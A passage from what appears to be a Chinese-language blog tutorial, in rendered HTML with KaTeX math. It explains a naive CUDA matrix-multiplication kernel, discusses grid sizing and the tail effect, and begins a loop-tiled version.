style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></li><li>时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>3</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li></ul><p>性能数据：</p><h2 id="CUDA-的核函数实现-——-naive-版本">CUDA 的核函数实现 —— naive 版本</h2><h3 id="实现原理">实现原理</h3><p>仍然计算矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mrow><mi>m</mi><mo>×</mo><mi>k</mi></mrow></msub><mo>⋅</mo><msub><mi>B</mi><mrow><mi>k</mi><mo>×</mo><mi>n</mi></mrow></msub><mo>=</mo><msub><mi>C</mi><mrow><mi>m</mi><mo>×</mo><mi>n</mi></mrow></msub></mrow><annotation encoding="application/x-tex">A_{m\times k} \cdot B_{k\times n} = C_{m\times n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2583em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mbin mtight">×</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span>。但这次使用 GPU 计算。不难想到，可以安排 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>×</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">m \times n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个线程，从 x 方向（行方向）看有m组线程，每组处理一行矩阵计算；从 y 方向（列方向）看有 n 组线程，每组处理 m 个线程。每个线程读取 A 中的第 m 行和 B 中的第 n 列，进而计算出 C[m, n]，替换掉 CPU 实现版本中的两层外循环。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// cuda kernel function</span><br><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">matMulNaiveGpu</span><span class="hljs-params">(<span class="hljs-type">float</span>* c, <span class="hljs-type">float</span>* a, <span class="hljs-type">float</span>* b, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>    <span class="hljs-type">int</span> y = blockIdx.y * blockDim.y + threadIdx.y;<br>    <span class="hljs-type">int</span> x = blockIdx.x * blockDim.x + threadIdx.x;<br>    <span class="hljs-type">float</span> v = <span class="hljs-number">0.0f</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>; i &lt; k; i++) &#123;<br>        v += a[y * k + i] * b[i * n + x];<br>    &#125;<br>    c[y * n + x] = v;<br>&#125;<br><br><span class="hljs-comment">// call in host</span><br><span class="hljs-comment">// suppose A[m, k] B[k, n] C[m, n]</span><br>dim3 grid_size = <span class="hljs-built_in">dim3</span>((m + block.x - <span class="hljs-number">1</span>) / block.x,<br>                      (n + block.y - <span class="hljs-number">1</span>) / block.y, <span class="hljs-number">1</span>);<br>matMulNaiveGpu&lt;&lt;&lt;grid_size, threadsPerBlock&gt;&gt;&gt;(c, a, b, m, n, k);<br></code></pre></td></tr></table></figure><p>下图演示了上面的矩阵乘中，每个线程负责读取和计算的单个矩阵C的元素：</p><p><img src="/img/PP/matmul_inner_product.gif" alt=""></p><p>这里容我再介绍此程序的另一个实现思路，当然也是为了呼应下文。不妨设想，矩阵乘也可以如此实现，将 A 矩阵的每一列看做一个列向量，将 B 矩阵的每一行看做一个行向量，两者相乘，得到 C 矩阵的一部分，再累加起来，也能完成矩阵乘运算：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>A</mi><mn>0</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>A</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>A</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>A</mi><mn>3</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>B</mi><mn>0</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>B</mi><mn>1</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>B</mi><mn>2</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>B</mi><mn>3</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><msub><mi>A</mi><mn>0</mn></msub><msub><mi>B</mi><mn>0</mn></msub><mo>+</mo><msub><mi>A</mi><mn>1</mn></msub><msub><mi>B</mi><mn>1</mn></msub><mo>+</mo><msub><mi>A</mi><mn>2</mn></msub><msub><mi>B</mi><mn>2</mn></msub><mo>+</mo><msub><mi>A</mi><mn>3</mn></msub><msub><mi>B</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">\begin{pmatrix}A_0 &amp; A_1 &amp; A_2 &amp; A_3\end{pmatrix}\begin{pmatrix}B_0 \\B_1 \\B_2 \\B_3\end{pmatrix}=A_0 B_0 + A_1 B_1 + A_2 B_2 + A_3 B_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.8em;vertical-align:-2.15em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.65em;"><span class="pstrut" style="height:6.8em;"></span><span style="width:0.875em;height:4.800em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="4.800em" viewBox="0 0 875 4800"><path d="M863,9c0,-2,-2,-5,-6,-9c0,0,-17,0,-17,0c-12.7,0,-19.3,0.3,-20,1c-5.3,5.3,-10.3,11,-15,17c-242.7,294.7,-395.3,682,-458,1162c-21.3,163.3,-33.3,349,-36,557 l0,1284c0.2,6,0,26,0,60c2,159.3,10,310.7,24,454c53.3,528,210,949.7,470,1265c4.7,6,9.7,11.7,15,17c0.7,0.7,7,1,19,1c0,0,18,0,18,0c4,-4,6,-7,6,-9c0,-2.7,-3.3,-8.7,-10,-18c-135.3,-192.7,-235.5,-414.3,-300.5,-665c-65,-250.7,-102.5,-544.7,-112.5,-882c-2,-104,-3,-167,-3,-189l0,-1292c0,-162.7,5.7,-314,17,-454c20.7,-272,63.7,-513,129,-723c65.3,-210,155.3,-396.3,270,-559c6.7,-9.3,10,-15.3,10,-18z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65em;"><span style="top:-4.65em;"><span class="pstrut" style="height:6.8em;"></span><span style="width:0.875em;height:4.800em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="4.800em" viewBox="0 0 875 4800"><path d="M76,0c-16.7,0,-25,3,-25,9c0,2,2,6.3,6,13c21.3,28.7,42.3,60.3,63,95c96.7,156.7,172.8,332.5,228.5,527.5c55.7,195,92.8,416.5,111.5,664.5c11.3,139.3,17,290.7,17,454c0,28,1.7,43,3.3,45l0,1209c-3,4,-3.3,16.7,-3.3,38c0,162,-5.7,313.7,-17,455c-18.7,248,-55.8,469.3,-111.5,664c-55.7,194.7,-131.8,370.3,-228.5,527c-20.7,34.7,-41.7,66.3,-63,95c-2,3.3,-4,7,-6,11c0,7.3,5.7,11,17,11c0,0,11,0,11,0c9.3,0,14.3,-0.3,15,-1c5.3,-5.3,10.3,-11,15,-17c242.7,-294.7,395.3,-681.7,458,-1161c21.3,-164.7,33.3,-350.7,36,-558l0,-1344c-2,-159.3,-10,-310.7,-24,-454c-53.3,-528,-210,-949.7,-470,-1265c-4.7,-6,-9.7,-11.7,-15,-17c-0.7,-0.7,-6.7,-1,-18,-1z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><h3 id="分析与性能数据">分析与性能数据</h3><p>同样的，</p><ul><li>计算次数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>×</mo><mi>n</mi><mo>×</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">m\times n\times k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，但有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>×</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">m \times n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个线程并行</li><li>时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span></li></ul><p>性能数据：</p><p>当然，这种实现简单但弊病多端。最重要的是，该实现与线程块的线程数量强相关，一旦矩阵大小发生变化，线程块的数量（即网格grid大小）也需要相应调整，若矩阵大小超出 grid 大小的限制，则此实现无法完成计算。而且，该 naive 版本的程序也限制了 GPU 的发挥。因为它要求 grid 的大小必须与矩阵大小适配，却忽视了针对硬件的适配，结合著名的<a href="https://zhuanlan.zhihu.com/p/442304996">如何设置CUDA Kernel中的grid_size和block_size？</a>中提到的 tail effect 概念👇，可知 GPU 在处理末尾数据时计算效率低下，无法被充分调用。</p><blockquote><p>我们可以想象，GPU 一次可以调度 SM 数量 × 每个 SM 最大 block 数个 block，因为每个 block 的计算量相等，所以所有 SM 应几乎同时完成这些 block 的计算，然后处理下一批，这其中的每一批被称之为一个 wave。想象如果 grid_size 恰好比一个 wave 多出一个 block，因为 stream 上的下个 kernel 要等这个 kernel 完全执行完成后才能开始执行，所以第一个 wave 完成后，GPU 上将只有一个 block 在执行，GPU 的实际利用率会很低，这种情况被称之为 tail effect，我们应尽量避免这种情况。将 grid_size 设置为精确的一个 wave 可能也无法避免 tail effect。</p></blockquote><h2 id="解除依赖-——-循环分块">解除依赖 —— 循环分块</h2><h3 id="实现原理-2">实现原理</h3><p>要想让程序能处理任何大小的矩阵乘，并让grid大小与矩阵大小解耦合，一定要使用循环对矩阵进行切分，再对切分后的小矩阵执行矩阵乘计算。与之前一样，我们还是让每个线程读取 A 中的第 m 行和 B 中的第 n 列，进而计算出 C[m, n]，但不同的是，这次 grid 大小不再于矩阵大小相关，我们假设矩阵的大小远超设备所能支持的最大线程数，因此我们不得不将矩阵切分为各个小块，分别执行计算。</p><p>我们从 naive 的 GPU 矩阵乘实现出发，一步一步地将下面的程序改造成循环分块的样子。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// cuda kernel function</span><br><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">matMulNaiveGpu</span><span class="hljs-params">(<span class="hljs-type">float</span>* c, <span class="hljs-type">float</span>* a, <span class="hljs-type">float</span>* b, <span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>    <span class="hljs-type">int</span> y = blockIdx.y * blockDim.y + threadIdx.y;<br>    <span class="hljs-type">int</span> x = blockIdx.x * blockDim.x + threadIdx.x;<br>    <span class="hljs-type">float</span> v = <span class="hljs-number">0.0f</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>; i &lt; k; i++) &#123;<br>        v += a[y * k + i] * b[i * n + x];<br>    &#125;<br>    c[y * n + x] = v;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于矩阵很大，x 方向与 y 方向矩阵元素数量都多于线程数量，因此需要对矩阵做<strong>二维切分</strong>。切分的块数取决于矩阵大小和线程数量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> thread_num_x = gridDim.x * blockDim.x;<br><span class="hljs-type">int</span> thread_num_y = gridDim.y * blockDim.y;<br><span class="hljs-type">int</span> x_grid_loop = (m + thread_num_x - <span class="hljs-number">1</span>) / thread_num_x;<br><span class="hljs-type">int</span> y_grid_loop = (n + thread_num_y - <span class="hljs-number">1</span>) / thread_num_y;<br></code></pre></td></tr></table></figure><p><code>x_grid_loop</code> 表示 x 方向有多少个被切分的小矩阵，同理于 <code>y_grid_loop</code>。</p><p>然后是内循环的改动，内循环中正确计算矩阵乘的关键是取对元素。先前的内循环没有考虑矩阵的分块。现在，我们把被切分的小矩阵的标号也考虑进去，因为一个小矩阵的大小是 <code>thread_num_x</code> x <code>thread_num_y</code>，若考虑一个第 mm 行，第 nn 列的小矩阵，其左上角的元素坐标就是 <code>mm * thread_num_x</code>，<code>nn * thread_num_y</code>。将其加入到原先的坐标变量中，即可得到正确的元素。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> x = mm * thread_num_x + blockIdx.x * blockDim.x + threadIdx.x;<br><span class="hljs-type">int</span> y = nn * thread_num_y + blockIdx.y * blockDim.y + threadIdx.y;<br></code></pre></td></tr></table></figure><p>最后将上面的改动整合起来，套上两层矩阵分块的循环，完成 <code>matmul_tile2d_gpu</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 